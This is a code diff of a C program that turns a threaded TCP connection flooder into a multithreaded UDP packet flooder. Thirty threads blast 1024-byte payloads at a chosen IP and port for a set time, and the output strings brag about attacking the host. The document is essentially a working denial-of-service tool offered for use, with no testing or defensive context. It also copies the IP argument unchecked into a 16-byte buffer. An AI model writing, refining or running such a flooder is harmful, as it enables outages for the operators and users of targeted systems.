@@ -1,87 +1,80 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <pthread.h>
+#include <unistd.h>
 #include <arpa/inet.h>
+#include <time.h>
 
-#define THREAD_COUNT 30  // Number of threads
-#define CONNECTION_COUNT 1000  // Connections per thread
+#define MAX_THREADS 30
+#define PAYLOAD_SIZE 1024  // Payload size in bytes
 
 typedef struct {
-    char *ip;
+    char ip[16];
     int port;
-    int interval;  // Time interval in seconds
-} thread_data_t;
+    int duration;
+} AttackParams;
 
-// Function for each thread to establish multiple connections
-void *establish_connections(void *arg) {
-    thread_data_t *data = (thread_data_t *)arg;
-    int connection_attempts = 0;
+void* send_payload(void* arg) {
+    AttackParams* params = (AttackParams*)arg;
+    int sock;
+    struct sockaddr_in server_addr;
+    char payload[PAYLOAD_SIZE];
 
-    for (int i = 0; i < CONNECTION_COUNT; i++) {
-        int sock;
-        struct sockaddr_in server_addr;
+    // Create a large payload to simulate high ping
+    memset(payload, 'A', PAYLOAD_SIZE - 1);
+    payload[PAYLOAD_SIZE - 1] = '\0';
 
-        // Create a socket
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) {
-            perror("Socket creation failed");
-            continue;
-        }
-
-        // Configure server address
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(data->port);
-        if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
-            perror("Invalid address or Address not supported");
-            close(sock);
-            continue;
-        }
-
-        // Attempt to connect to the server
-        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-            printf("Connection established by thread %ld (attempt %d)\n", pthread_self(), ++connection_attempts);
-        } else {
-            perror("Connection failed");
-        }
-
-        // Close the connection
-        close(sock);
-
-        // Wait for the specified interval before the next connection
-        sleep(data->interval);
+    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
+    if (sock < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
     }
 
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(params->port);
+    server_addr.sin_addr.s_addr = inet_addr(params->ip);
+
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < params->duration) {
+        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            perror("Send failed");
+            break;
+        }
+    }
+
+    close(sock);
     pthread_exit(NULL);
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char* argv[]) {
     if (argc != 4) {
-        fprintf(stderr, "Usage: %s <IP> <PORT> <INTERVAL>\n", argv[0]);
-        return EXIT_FAILURE;
+        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        return 1;
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int interval = atoi(argv[3]);
+    AttackParams params;
+    strcpy(params.ip, argv[1]);
+    params.port = atoi(argv[2]);
+    params.duration = atoi(argv[3]);
 
-    pthread_t threads[THREAD_COUNT];
-    thread_data_t data = {ip, port, interval};
+    pthread_t threads[MAX_THREADS];
 
-    // Create threads
-    for (int i = 0; i < THREAD_COUNT; i++) {
-        if (pthread_create(&threads[i], NULL, establish_connections, &data) != 0) {
+    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
+           params.ip, params.port, params.duration, MAX_THREADS);
+
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
             perror("Thread creation failed");
-            return EXIT_FAILURE;
         }
     }
 
-    // Wait for all threads to complete
-    for (int i = 0; i < THREAD_COUNT; i++) {
+    for (int i = 0; i < MAX_THREADS; i++) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("All threads completed.\n");
-    return EXIT_SUCCESS;
+    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
+           params.ip, params.port, params.duration);
+
+    return 0;
 }
